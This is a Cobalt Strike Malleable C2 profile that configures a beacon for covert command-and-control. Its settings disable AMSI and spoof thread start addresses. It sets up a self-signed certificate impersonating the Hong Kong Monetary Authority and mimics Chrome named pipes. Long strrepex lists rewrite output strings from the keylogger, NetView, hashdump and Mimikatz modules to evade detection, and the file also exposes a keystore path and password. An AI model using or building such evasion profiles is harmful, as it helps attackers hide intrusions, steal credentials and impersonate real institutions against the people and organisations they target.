# Malleable C2 Profile
# File: mdm.profile
# Authors: @schaze
# Credits : https://github.com/WKL-Sec/Malleable-CS-Profiles/tree/main

################################################
## Tips for Profile Parameter Values
################################################

## Parameter Values
## Enclose parameter in Double quote, not single
##      set useragent "SOME AGENT";   GOOD
##      set useragent 'SOME AGENT';   BAD

## Some special characters do not need escaping 
##      prepend "!@#$%^&*()";

## Semicolons are ok
##      prepend "This is an example;";

## Escape Double quotes
##      append "here is \"some\" stuff";

## Escape Backslashes 
##      append "more \\ stuff";

## HTTP Values
## Program .http-post.client must have a compiled size less than 252 bytes.

################################################
## Profile Name
################################################
## Description:
##    The name of this profile (used in the Indicators of Compromise report)
## Defaults:
##    sample_name: My Profile
## Guidelines:
##    - Choose a name that you want in a report
set sample_name "MDM Profile";

################################################
## Sleep Times
################################################
## Description:
##    Timing between beacon check in
## Defaults:
##    sleeptime: 60000
##    jitter: 0
## Guidelines:
##    - Beacon Timing in milliseconds (1000 = 1 sec)
# set sleeptime "45000";         # 45 Seconds
#set sleeptime "300000";       # 5 Minutes
set sleeptime "120000";      # 2 minutes (120,000 ms). Lower to 30000-60000 during testing of live-streaming sacrificial mode if needed.
#set sleeptime "900000";      # 15 Minutes
#set sleeptime "1200000";      # 20 Minutes
#set sleeptime "1800000";      # 30 Minutes
#set sleeptime "3600000";      # 1 Hours
set jitter    "45";            # % jitter

################################################
##  Server Response Size jitter
################################################pr
##  Description:
##   Append random-length string (up to data_jitter value) to http-get and http-post server output.
set data_jitter "100";          

################################################
##  HTTP Client Header Removal
################################################
##  Description:
##      Global option to force Beacon's WinINet to remove specified headers late in the HTTP/S transaction process.
## Value:
##      headers_remove              Comma-separated list of HTTP client headers to remove from Beacon C2.
# set headers_remove "Strict-Transport-Security, header2, header3";

################################################
## Beacon User-Agent
################################################
## Description:
##    User-Agent string used in HTTP requests, CS versions < 4.2 approx 128 max characters, CS 4.2+ max 255 characters
## Defaults:
##    useragent: Internet Explorer (Random)
## Guidelines
##    - Use a User-Agent values that fits with your engagement
##    - useragent can only be 128 chars
## IE 10
# set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)";
## MS IE 11 User Agent
#set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.3124.68";

################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
    
#     ## Option 1) Trusted and Signed Certificate
#     ## Use keytool to create a Java Keystore file. 
#     ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
#     ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
   
#     ## Option 2) Create your own Self-Signed Certificate
#     ## Use keytool to import your own self signed certificates

#     #set keystore "";
#     #set password "password";
#     set keystore "/opt/cobaltstrike/sgresearchinstitute.comStore";
#     set password "madani2211";
#     ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   "HK";
    set CN  "hkma.gov.hk";
    set O   "Hong Kong Monetary Authority";
    set OU  "Certificate Authority";
    set validity "365";
}

################################################
## Task and Proxy Max Size
################################################
## Description:
##    Added in CS4.6
##    Control how much data (tasks and proxy) is transferred through a communication channel
## Defaults:
##    tasks_max_size "1048576";         # 1 MB
##    tasks_proxy_max_size "921600";    # 900 KB
##    tasks_dns_proxy_max_size "71680"; # 70 KB
## Guidelines
##    - For tasks_max_size determine the largest task that will be sent to your target(s).
##      This setting is patched into beacon when it is generated, so the size
##      needs to be determined prior to generating beacons for your target(s).
##      If a beacon within a communication chain does not support the received task size
##      it will be ignored.
##    - It is recommended to not modify the proxy max sizes
##
set tasks_max_size "90097152"; # 90 MB — supports large assemblies (winPEAS ~12 MB, SharpHound, Costura-bundled tools)
set tasks_proxy_max_size "9216000";
set tasks_dns_proxy_max_size "9216000";


################################################
## HTTP Beacon
################################################
## Description:
##   Allows you to specify attributes for general attributes for the http(s) beacons.
## Values:
##    library       wininet             CS 4.9 - The library attribute allows user to specify the default library used by the generated beacons used by the profile. The library defaults to "wininet", which is the only type of beacon prior to version 4.9. The library value can be "wininet" or "winhttp".
##

################################################
## TCP Beacon
################################################
## Description:
##    TCP Beacon listen port
##     - https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/
##     - https://www.cobaltstrike.com/help-tcp-beacon
##    TCP Frame Header
##     - Added in CS 4.1, prepend header to TCP Beacon messages
## Defaults:
##    tcp_port: 4444
##    tcp_frame_header: N\A
## Guidelines
##    - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port.
##    - Use a port other that default. Choose something not is use.
##    - Use a port greater than 1024 is generally a good idea
set tcp_port "42585";
set tcp_frame_header "\x80";

################################################
## SMB beacons
################################################
## Description:
##    Peer-to-peer beacon using SMB for communication
##    SMB Frame Header
##     - Added in CS 4.1, prepend header to SMB Beacon messages
## Defaults:
##    pipename: msagent_##
##    pipename_stager: status_##
##    smb_frame_header: N\A
## Guidelines:
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict!
##    - the ## is replaced with a number unique to a teamserver     
## ---------------------
set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
#set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe
set smb_frame_header "\x80";

################################################
## DNS beacons
################################################
## Description:
##    Beacon that uses DNS for communication
## Defaults:
##    maxdns: 255
##    dns_idle: 0.0.0.0
##    dns_max_txt: 252
##    dns_sleep: 0
##    dns_stager_prepend: N/A
##    dns_stager_subhost: .stage.123456.
##    dns_ttl: 1
## Guidelines:
##    - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels
# set maxdns          "255";
# set dns_max_txt     "252";
# set dns_idle        "0.0.0.0"; #google.com (change this to match your campaign)
# set dns_sleep       "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
# set dns_stager_prepend ".resources.123456.";
# set dns_stager_subhost ".feeds.123456.";

################################################
## SSH beacons
################################################
## Description:
##    Peer-to-peer SSH pseudo-Beacon for lateral movement
##    ssh_banner
##    - Added in Cobalt Strike 4.1, changes client SSH banner
## Defaults:
##    ssh_banner: Cobalt Strike 4.2
set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename      "wkssvc##";


################################################
## Staging process
################################################
## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads
## Description:
##    Malleable C2's http-stager block customizes the HTTP staging process
## Defaults:
##    uri_x86 Random String
##    uri_x64 Random String
##    HTTP Server Headers - Basic HTTP Headers
##    HTTP Client Headers - Basic HTTP Headers
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Only specify the `Host` header when peforming domain fronting. Be aware of HTTP proxy's rewriting your request per RFC2616 Section 14.23
##      - https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)

#set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set

################################################
## Post Exploitation
################################################
## Description:
##    Controls post-exploitation jobs, including default x86/x64 program to open and inject shellcode into, AMSI bypass for execute-assembly, powerpick, and psinject
##    https://www.cobaltstrike.com/help-malleable-postex
## Values:
##    spawnto_x86       %windir%\\syswow64\\rundll32.exe
##    spawnto_x64       %windir%\\sysnative\\rundll32.exe
##    obfuscate         false                                   CS 3.14 - Scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way
##    pipename          postex_####, windows\\pipe_##           CS 4.2 - Change the named pipe names used, by post-ex DLLs, to send output back to Beacon. This option accepts a comma-separated list of pipenames. Cobalt Strike will select a random pipe name from this option when it sets up a post-exploitation job. Each # in the pipename is replaced with a valid hex character as well.
##    smartinject       false                                   CS 3.14 added to postex block - Directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs.
##    amsi_disable      false                                   CS 3.13 - Directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    keylogger         GetAsyncKeyState                        CS 4.2 - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to observe keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to observe keystrokes.
##    threadhint                                                CS 4.2 - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address. Specify the thread hint as "module!function+0x##" to specify the start address to spoof. The optional 0x## part is an offset added to the start address.
## Guidelines
##    - spawnto can only be 63 chars
##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
##      - sysnative for x64 and syswow64 for x86
##      - Example x64 : C:\\Windows\\sysnative\\w32tm.exe
##        Example x86 : C:\\Windows\\syswow64\\w32tm.exe
##    - The binary doesnt do anything wierd (protected binary, etc)
##    - !! Don't use these !! 
##    -   "csrss.exe","logoff.exe","rdpinit.exe","bootim.exe","smss.exe","userinit.exe","sppsvc.exe"
##    - A binary that executes without the UAC
##    - 64 bit for x64
##    - 32 bit for x86
##    - You can add command line parameters to blend
##      - set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
##      - set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
##      - Note: svchost.exe may look weird as the parent process 
##    - The obfuscate option scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way. It’s very similar to the obfuscate and userwx options available for Beacon via the stage block.
##    - The amsi_disable option directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    - The smartinject option directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll

post-ex {
    # OPSEC: dllhost.exe is a COM surrogate — by-design spawnable with arbitrary
    # parent, no service-managed parent expectation. GUID is WSearchProtocolHost
    # (legitimate Windows class). Avoid wmiprvse.exe -Embedding here: Win11 22H2+
    # WMI service kills orphan wmiprvse (anti-injection mitigation), and standalone
    # COM activation context isn't valid → sacrificial dies before CLR init →
    # operator sees "PID 0" / no output. dllhost.exe also has fewer ASR rules
    # flagging it vs wmiprvse.
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set obfuscate "true";
    set smartinject "true";  # REQUIRED for senjata HWBP bypasses to resolve targets reliably
    set cleanup "true";
    set amsi_disable "true"; # Belt-and-braces: senjata also installs its own patchless AMSI HWBP
    set keylogger "GetAsyncKeyState";

    # Spoofed thread start address for post-ex threads. Required for OPSEC of
    # any multi-threaded post-ex tool (senjata-runner spawns a streamer thread).
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x21";
    #set threadhint "kernel32.dll!BaseThreadInitThunk+0x14"
    transform-x64 { 
        # replace the strings in the port scanner dll 
        strrepex "PortScanner" "Scanner module is complete" "";
        strrepex "PortScanner" "(ICMP) Target" "pmci trg=";
        strrepex "PortScanner" "is alive." "is up.";
        strrepex "PortScanner" "(ARP) Target" "rpa trg=";
        strrepex "PortScanner" "[read %d bytes]" "";
        strrepex "PortScanner" "[-] Error: Failed to initialise WinSock. Winsock error code" "";
        strrepex "PortScanner" ". Exteneded error code" "";
        strrepex "PortScanner" "platform:" "pltfm=";
        strrepex "PortScanner" "version:" "vrs=";
        strrepex "PortScanner" "name:" "name=";
        strrepex "PortScanner" "domain:" "dmn=";
        
        strrepex "Hashdump" "[-] no results." "";
        
        strrepex "Keylogger" "=======" "";
        strrepex "Keylogger" "[backspace]" "<bckspc>";
        strrepex "Keylogger" "[tab]" "<tb>";
        strrepex "Keylogger" "[clear]" "<clr>";
        strrepex "Keylogger" "[shift]" "<alt>";
        strrepex "Keylogger" "[control]" "<ctrl>";
        strrepex "Keylogger" "[alt]" "<alt>";
        strrepex "Keylogger" "[pause]" "<pause>";
        strrepex "Keylogger" "[caps lock]" "<cpslck>";
        strrepex "Keylogger" "[escape]" "<esc>";
        strrepex "Keylogger" "[page up]" "<pgup>";
        strrepex "Keylogger" "[page down]" "<pgdwn>";
        strrepex "Keylogger" "[end]" "<end>";
        strrepex "Keylogger" "[home]" "<home>";
        strrepex "Keylogger" "[left]" "<left>";
        strrepex "Keylogger" "[up]" "<^>";
        strrepex "Keylogger" "[right]" "<right>";
        strrepex "Keylogger" "[down]" "<dwn>";
        strrepex "Keylogger" "[prtscr]" "<prtsc>";
        strrepex "Keylogger" "[insert]" "<insert>";
        strrepex "Keylogger" "[delete]" "<dlt>";
        strrepex "Keylogger" "[help]" "<help>";
        strrepex "Keylogger" "[command]" "<cmd>";
        strrepex "Keylogger" "[menu]" "<menu>";
        strrepex "Keylogger" "[F1]" "f1";
        strrepex "Keylogger" "[F2]" "f2";
        strrepex "Keylogger" "[F3]" "f3";
        strrepex "Keylogger" "[F4]" "f4";
        strrepex "Keylogger" "[F5]" "f5";
        strrepex "Keylogger" "[F6]" "f6";
        strrepex "Keylogger" "[F7]" "f7";
        strrepex "Keylogger" "[F8]" "f8";
        strrepex "Keylogger" "[F9]" "f9";
        strrepex "Keylogger" "[F10]" "f10";
        strrepex "Keylogger" "[F11]" "f11";
        strrepex "Keylogger" "[F12]" "f12";
        strrepex "Keylogger" "[F13]" "f13";
        strrepex "Keylogger" "[F14]" "f14";
        strrepex "Keylogger" "[F15]" "f15";
        strrepex "Keylogger" "[F16]" "f16";
        strrepex "Keylogger" "[F17]" "f17";
        strrepex "Keylogger" "[F18]" "f18";
        strrepex "Keylogger" "[F19]" "f19";
        strrepex "Keylogger" "[F20]" "f20";
        strrepex "Keylogger" "[F21]" "f21";
        strrepex "Keylogger" "[F22]" "f22";
        strrepex "Keylogger" "[F23]" "f23";
        strrepex "Keylogger" "[F24]" "f24";
        strrepex "Keylogger" "[numlock]" "<numlck>";
        strrepex "Keylogger" "[scroll lock]" "<scrllock>";
        strrepex "Keylogger" "[ctrl]" "ctrl";
        
        strrepex "NetView" "[-] Error:" "";
        strrepex "NetView" "IP Address" "ipaddr";
        strrepex "NetView" "Server Name" "srv";
        strrepex "NetView" "Server Name" "srv";
        strrepex "NetView" "-----------" "";
        strrepex "NetView" "----------" "";
        strrepex "NetView" "---------" "";
        strrepex "NetView" "--------" "";
        strrepex "NetView" "-------" "";
        strrepex "NetView" "----" "";
        strrepex "NetView" "Domain Controllers" "DC";
        strrepex "NetView" "Domain Computers" "PC";
        strrepex "NetView" "Comment" "Desc";
        strrepex "NetView" "Name" "name";
        strrepex "NetView" "computers" "pc";
        strrepex "NetView" "localhost" "local";
        strrepex "NetView" "Computers:" "PC:";
        strrepex "NetView" "Computers in domain" "PC domain";
        strrepex "NetView" "dclist" "dc";
        strrepex "NetView" "DCs" "dcs";
        strrepex "NetView" "DCs in domain" "dsc domain";
        strrepex "NetView" "Domain Controllers:" "dc:";
        strrepex "NetView" "Domain Controllers in domain" "dc domain";
        strrepex "NetView" "List of domain trusts:" "";
        strrepex "NetView" "group" "grp";
        strrepex "NetView" "Members of" "mbmrs of";
        strrepex "NetView" "Groups:" "grps:";
        strrepex "NetView" "Groups for" "grps for";
        strrepex "NetView" "localgroup" "lclgrp";
        strrepex "NetView" "Local groups for" "lcl grps for";
        strrepex "NetView" "logons" "lgns";
        strrepex "NetView" "Logged on users at" "lggon usrs at";
        strrepex "NetView" "sessions" "sess";
        strrepex "NetView" "Sessions for" "sess for";
        strrepex "NetView" "share" "shre";
        strrepex "NetView" "Shares at" "shres at";
        strrepex "NetView" "Users for" "usrs for";
        strrepex "NetView" "user" "usr";
        strrepex "NetView" "Account information for" "acc info for";
        strrepex "NetView" "List of hosts:" "hostlist:";
        strrepex "NetView" "List of hosts for domain" "hostlist domain";
        strrepex "NetView" "Idle (s)" "sleeping";
        strrepex "NetView" "Active (s)" "alive";
        strrepex "NetView" "User name" "usrname";
        strrepex "NetView" "Computer" "pc";
        strrepex "NetView" "Share name" "";
        strrepex "NetView" "Current time at" "";
        strrepex "NetView" "(Forest tree root)" "";
        strrepex "NetView" "(Forest" "";
        strrepex "NetView" "(Primary Domain)" "";
        strrepex "NetView" "(Direct Outbound)" "";
        strrepex "NetView" "(Direct Inbound)" "";
        strrepex "NetView" "(Native)" "";
        strrepex "NetView" "Full Name" "";
        strrepex "NetView" "User's Comment" "";
        strrepex "NetView" "Country code" "";
        strrepex "NetView" "Account active" "";
        strrepex "NetView" "Yes" "";
        strrepex "NetView" "Never" "";
        strrepex "NetView" "Account expires" "";
        strrepex "NetView" "Admin" "";
        strrepex "NetView" "Account type" "";
        strrepex "NetView" "Guest" "";
        strrepex "NetView" "User" "";
        strrepex "NetView" "Password last set" "";
        strrepex "NetView" "hours ago" "";
        strrepex "NetView" "Password expires" "";
        strrepex "NetView" "Password changeable" "";
        strrepex "NetView" "Password required" "";
        strrepex "NetView" "User may change password" "";
        strrepex "NetView" "Workstations allowed" "";
        strrepex "NetView" "Logon script" "";
        strrepex "NetView" "User profile" "";
        strrepex "NetView" "Home directory" "";
        strrepex "NetView" "Last logon" "";
        strrepex "NetView" "(admin)" "";
        strrepex "NetView" "unknown" "";
        strrepex "NetView" "Type" "";
        strrepex "NetView" "Version" "";
        strrepex "NetView" "Platform" "";
        strrepex "NetView" "PDC" "";
        strrepex "NetView" "BDC" "";

        strrepex "Mimikatz" "OK !" "";
        strrepex "Mimikatz" "data copy @" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_enum_kerberos_callback_pth ; kull_m_memory_copy (0x" "";
        strrepex "Mimikatz" "\\_" "";
        strrepex "Mimikatz" "Ticket Granting Ticket" "tigranti";
        strrepex "Mimikatz" "Client Ticket" "";
        strrepex "Mimikatz" "Ticket Granting Service" "tigranse";
        strrepex "Mimikatz" "Cachedir:" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_tryDecode ; SkpEncryptionWorker(decrypt):" "";
        strrepex "Mimikatz" "-- invalidating the key" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_candidatekey_add ; No key?" "";
        strrepex "Mimikatz" "Encrypted:" "enc:";
        strrepex "Mimikatz" "unkData2 :" "";
        strrepex "Mimikatz" "* unkData1 :" "";
        strrepex "Mimikatz" "AuthData  :" "";
        strrepex "Mimikatz" "Tag       :" "";
        strrepex "Mimikatz" "KdfContext:" "";
        strrepex "Mimikatz" "* LSA Isolated Data:" "";
        strrepex "Mimikatz" "* RootKey  :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_trymarshal ; CredUnmarshalCredential (0x" "";
        strrepex "Mimikatz" "[?] ?" "";
        strrepex "Mimikatz" "[UsernameForPacked] ?" "";
        strrepex "Mimikatz" "[BinaryBlob]" "";
        strrepex "Mimikatz" "[UsernameTarget]" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_trymarshal ; Credential->cbSize is" "";
        strrepex "Mimikatz" "[Cert] SHA1:" "1ahs";
        strrepex "Mimikatz" "* Marshaled:" "";
        strrepex "Mimikatz" "LUID KO" "";
        strrepex "Mimikatz" "* Password:" "pwd";
        strrepex "Mimikatz" "* Domain   :" "";
        strrepex "Mimikatz" "* Username :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Unknown version in Kerberos credentials structure" "";
        strrepex "Mimikatz" "<no size, buffer is incorrect>" "";
        strrepex "Mimikatz" "* Key     :" "yek:";
        strrepex "Mimikatz" "Provider :" "";
        strrepex "Mimikatz" "Container:" "";
        strrepex "Mimikatz" "Reader   :" "";
        strrepex "Mimikatz" "Card     :" "";
        strrepex "Mimikatz" "PIN code :" "";
        strrepex "Mimikatz" "* Smartcard" "";
        strrepex "Mimikatz" "(sha1:" "";
        strrepex "Mimikatz" "DPAPI Key:" "";
        strrepex "Mimikatz" "PRT      :" "";
        strrepex "Mimikatz" "* Raw data :" "";
        strrepex "Mimikatz" "* DPAPI    :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Size error for NtlmHash LsaIso output" "";
        strrepex "Mimikatz" "* SHA1    :" "";
        strrepex "Mimikatz" "* LM      :" "";
        strrepex "Mimikatz" "* NTLM    :" "mltn:";
        strrepex "Mimikatz" "* NTLM     :" "mtln:";
        strrepex "Mimikatz" "* LM       :" "";
        strrepex "Mimikatz" "* Domain   :" "";
        strrepex "Mimikatz" "* Username :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; memory handle is not KULL_M_MEMORY_TYPE_PROCESS" "";
        strrepex "Mimikatz" "\\_ kerberos -" "";
        strrepex "Mimikatz" "\\_ msv1_0   -" "";
        strrepex "Mimikatz" "|  LUID" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; NtQueryObject:" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; OpenProcess" "";
        strrepex "Mimikatz" "is now R/W" "";
        strrepex "Mimikatz" "was already R/W" "";
        strrepex "Mimikatz" "|  LSA Process" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing at least one argument : ntlm/rc4 OR aes128 OR aes256" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Bas user or LUID" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; OpenProcessToken" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; GetTokenInformation" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; DuplicateTokenEx" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; SetThreadToken" "";
        strrepex "Mimikatz" "** Token Impersonation **" "";
        strrepex "Mimikatz" "|  TID  %u" "";
        strrepex "Mimikatz" "|  PID  %u" "";
        strrepex "Mimikatz" ": replacing NTLM/RC4 key in a session" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; ntlm hash/rc4 key length must be 32 (16 bytes)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key length must be 64 (32 bytes)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key length must be 32 (16 bytes)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : user" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : domain" "";
        strrepex "Mimikatz" "impers." "";
        strrepex "Mimikatz" "luid" "";
        strrepex "Mimikatz" "SID               :" "";
        strrepex "Mimikatz" "Logon Time        :" "";
        strrepex "Mimikatz" "Logon Server      :" "";
        strrepex "Mimikatz" "Domain            :" "";
        strrepex "Mimikatz" "User Name         :" "";
        strrepex "Mimikatz" "Session           :" "";
        strrepex "Mimikatz" "Authentication Id :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory" "";
        strrepex "Mimikatz" "Unknown !" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Key import" "";
        strrepex "Mimikatz" "candidate keys found" "";
        strrepex "Mimikatz" " > SecureKernel stream found in minidump (" "";
        strrepex "Mimikatz" "bytes)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump without SystemInfoStream (?)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->ProcessorArchitecture (" "";
        strrepex "Mimikatz" "!= PROCESSOR_ARCHITECTURE_AMD64 (" "";
        strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; LSASS process not found (?)" "";
        strrepex "Mimikatz" "file for minidump..." "";
        strrepex "Mimikatz" "Opening :" "";
        strrepex "Mimikatz" "SekurLSA module" "";
        strrepex "Mimikatz" "List Credentials Manager" "";
        strrepex "Mimikatz" "List Cached MasterKeys" "";
        strrepex "Mimikatz" "List Kerberos Encryption Keys" "";
        strrepex "Mimikatz" "List Kerberos tickets" "";
        strrepex "Mimikatz" "Preferred Backup Master keys" "";
        strrepex "Mimikatz" "Antisocial" "";
        strrepex "Mimikatz" "DPAPI_SYSTEM secret" "";
        strrepex "Mimikatz" "dpapisystem" "";
        strrepex "Mimikatz" "krbtgt!" "";
        strrepex "Mimikatz" "Pass-the-hash" "";
        strrepex "Mimikatz" "Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials" "";
        strrepex "Mimikatz" "Switch (or reinit) to LSASS minidump context" "";
        strrepex "Mimikatz" "Lists CloudAp credentials" "";
        strrepex "Mimikatz" "Switch (or reinit) to LSASS process  context" "";
        strrepex "Mimikatz" "Lists all available providers credentials" "";
        strrepex "Mimikatz" "List SSP credentials" "";
        strrepex "Mimikatz" "Lists LiveSSP credentials" "";
        strrepex "Mimikatz" "Lists TsPkg credentials" "";
        strrepex "Mimikatz" "Lists Kerberos credentials" "";
        strrepex "Mimikatz" "Lists WDigest credentials" "";
        strrepex "Mimikatz" "Lists LM & NTLM credentials" "";
        strrepex "Mimikatz" "Some commands to enumerate credentials..." "";
        strrepex "Mimikatz" "Try to decrypt" "";
        strrepex "Mimikatz" "Try to sign" "";
        strrepex "Mimikatz" "Try do decrypt a PIN Protector" "";
        strrepex "Mimikatz" "Verify Name for:" "";
        strrepex "Mimikatz" "SessionKey:" "";
        strrepex "Mimikatz" "pNC->Name:" "";
        strrepex "Mimikatz" "pNC->Sid :" "";
        strrepex "Mimikatz" "pNC->Guid:" "";
        strrepex "Mimikatz" "ulExtendedOp:" "";
        strrepex "Mimikatz" "cMaxBytes   :" "";
        strrepex "Mimikatz" "cMaxObjects :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcshadow_encode_sensitive_value ; Unexpected hash len" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcshadow_encode_sensitive_value ; RtlEncryptNtOwfPwdWithIndex" "";
        strrepex "Mimikatz" "(not an object GUID)" "";
        strrepex "Mimikatz" "Link to key with GUID:" "";
        strrepex "Mimikatz" "** TRUSTED DOMAIN - Antisocial **" "";
        strrepex "Mimikatz" "BCKUPKEY_PREFERRED Secret" "";
        strrepex "Mimikatz" "BCKUPKEY_P Secret" "";
        strrepex "Mimikatz" "BCKUPKEY_" "";
        strrepex "Mimikatz" "Unknown data :" "";
        strrepex "Mimikatz" "Last change:" "";
        strrepex "Mimikatz" "Password   :" "pwd:";
        strrepex "Mimikatz" "Partner              :" "";
        strrepex "Mimikatz" "LAPS:" "";
        strrepex "Mimikatz" "Credentials:" "";
        strrepex "Mimikatz" "Object Relative ID   :" "";
        strrepex "Mimikatz" "Object Security ID   :" "";
        strrepex "Mimikatz" "SID history:" "";
        strrepex "Mimikatz" "Password last change :" "";
        strrepex "Mimikatz" "Account expiration   :" "";
        strrepex "Mimikatz" "User Account Control :" "";
        strrepex "Mimikatz" "Account Type         :" "";
        strrepex "Mimikatz" "User Principal Name  :" "";
        strrepex "Mimikatz" "SAM Username         :" "";
        strrepex "Mimikatz" "** SAM ACCOUNT **" "";
        strrepex "Mimikatz" "Key Package          : [" "";
        strrepex "Mimikatz" "Key Package Size     :" "";
        strrepex "Mimikatz" "byte(s)" "";
        strrepex "Mimikatz" "Recovery Password    :" "";
        strrepex "Mimikatz" "Recovery GUID (fake) :" "";
        strrepex "Mimikatz" "Recovery GUID        :" "";
        strrepex "Mimikatz" "Volume GUID          :" "";
        strrepex "Mimikatz" "** BITLOCKER RECOVERY INFORMATION **" "";
        strrepex "Mimikatz" "Object RDN           :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_descrObject_csv ; RtlDecryptNtOwfPwdWithIndex" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_decrypt ; RtlDecryptNtOwfPwdWithIndex/RtlDecryptLmOwfPwdWithIndex" "";
        strrepex "Mimikatz" "Hash " "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; ldap_search_s 0x" "";
